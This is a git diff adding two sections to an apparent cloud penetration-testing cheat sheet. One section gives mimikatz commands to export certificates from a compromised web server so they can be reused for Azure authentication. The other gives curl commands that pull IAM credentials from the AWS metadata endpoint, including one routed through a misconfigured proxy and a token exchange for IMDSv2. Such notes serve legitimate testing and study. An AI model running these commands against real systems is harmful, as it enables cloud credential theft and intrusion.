@@ -3,6 +3,8 @@
 * [Password attacks](#Password-attacks)
   * [Password spraying](#Password-spraying)
   * [Key disclosure in public repositories](#Key-disclosure-in-public-repositories)
+  * [Reused access](#Reused-access)
+  * [AWS Instance Metadata](#AWS-Instance-Metadata)
 * [Web-Application Vulnerabilities](#Web-application-vulnerabilities)
   * [Insecure file upload](#Insecure-file-upload)
   * [Server Side Template Injection](#Server-Side-Template-Injection)
@@ -46,6 +48,49 @@ C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
 #### Use web browser to view the commit
 ```
 https://github.com/[git account]/[repo name]/commit/[commit ID]
+```
+
+## Reused access 
+- certs as private keys on web servers
+1. Comprimise web server
+2. Extract certificate with mimkatz
+3. Use it to authenticate to Azure
+```
+mimikatz# crypto::capi
+mimikatz# privilege::debug
+mimikatz# crypto::cng
+mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
+```
+
+### AWS Instance Metadata
+- Metadata endpoint is hosted on a non routable IP adress at 169.254.169.254
+- Can contain access/secret keys to AWS and IAM credentials
+- Server compromise or SSRF vulnerabilities might allow remote attackers to reach it.
+- IAM credentials can be stored here ```http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>```
+- New version requeres token, a put request is send and then responded to with a token. Then that token can be used to query data
+
+#### Instance Metadata Service URL
+```
+http://169.254.169.254/latest/meta-data
+```
+
+#### Additional IAM creds possibly available here
+
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
+```
+
+- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured
+
+```bash
+curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
+```
+
+#### IMDS Version 2 has some protections 
+- but these commands can be used to access it
+```bash
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
+curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
 ```
 
 ## Web application vulnerabilities
